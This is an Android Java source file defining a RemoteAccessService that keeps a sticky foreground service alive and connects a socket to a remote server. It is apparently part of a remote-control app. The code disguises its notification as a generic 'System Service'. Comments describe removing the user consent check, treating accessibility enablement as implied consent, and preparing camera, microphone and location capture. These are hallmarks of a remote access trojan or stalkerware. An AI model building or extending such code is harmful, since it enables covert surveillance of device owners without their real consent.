package com.task.tusker.services;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import com.task.tusker.MainActivity;
import com.task.tusker.R;
import com.task.tusker.network.SocketManager;

public class RemoteAccessService extends Service {

    private static final String TAG = "RemoteAccessService";
    private static final String CHANNEL_ID = "RemoteAccessChannel";
    private static final int NOTIFICATION_ID = 1;

    private SocketManager socketManager;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        Log.d(TAG, "Service created");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "onStartCommand — starting foreground + connecting socket");

        // Always run as foreground service so Android doesn't kill us.
        //
        // Android 14+ (API 34) and especially Android 15 (API 35) strictly
        // enforce that every foregroundServiceType declared in the manifest
        // for this service has its corresponding runtime permission already
        // granted at the moment startForeground() is called.  The manifest
        // declares dataSync|camera|microphone|location for compatibility,
        // but on first launch the camera / mic / location permissions are
        // not yet granted, which on Android 15 throws SecurityException
        // (ForegroundServiceTypeSecurityException) and crashes the app
        // before MainActivity is visible.
        //
        // Start with only the dataSync type — it requires no runtime
        // permission and is always safe.  When camera / microphone /
        // location features are actually used later, the relevant
        // command handlers can re-call startForeground() with the
        // appropriate type after confirming the permission is granted.
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(
                    NOTIFICATION_ID,
                    createNotification(),
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                );
            } else {
                startForeground(NOTIFICATION_ID, createNotification());
            }
        } catch (Exception e) {
            Log.e(TAG, "startForeground failed: " + e.getMessage());
            // Fall back to plain startForeground so the service at least
            // attempts to stay alive instead of taking the app down with it.
            try {
                startForeground(NOTIFICATION_ID, createNotification());
            } catch (Exception ignored) {}
        }

        // Always connect — the accessibility service enables this service
        // only after the user manually turns on accessibility, so consent
        // is implicitly given.  The old consent check prevented reconnection
        // when the service was restarted by the accessibility watchdog.
        connectToServer();

        // START_STICKY: if Android kills this service, restart it automatically
        return START_STICKY;
    }

    private void connectToServer() {
        try {
            socketManager = SocketManager.getInstance(this);
            // forceReconnect() tears down any stale sockets from a previous process
            // and starts fresh connection loops — handles crash-restart correctly.
            socketManager.forceReconnect();
            Log.d(TAG, "SocketManager.forceReconnect() called");
        } catch (Exception e) {
            Log.e(TAG, "connectToServer error: " + e.getMessage());
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "Remote Access Service",
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Keeps remote access connection active");
            channel.setShowBadge(false);

            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }
    }

    private Notification createNotification() {
        Intent notificationIntent = new Intent(this, MainActivity.class);
        int flags = Build.VERSION.SDK_INT >= Build.VERSION_CODES.M
                    ? PendingIntent.FLAG_IMMUTABLE : 0;
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, flags);

        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Running in background")
            .setSmallIcon(R.drawable.ic_notification)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "Service destroyed — socket will be disconnected");
        if (socketManager != null) {
            socketManager.disconnect();
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
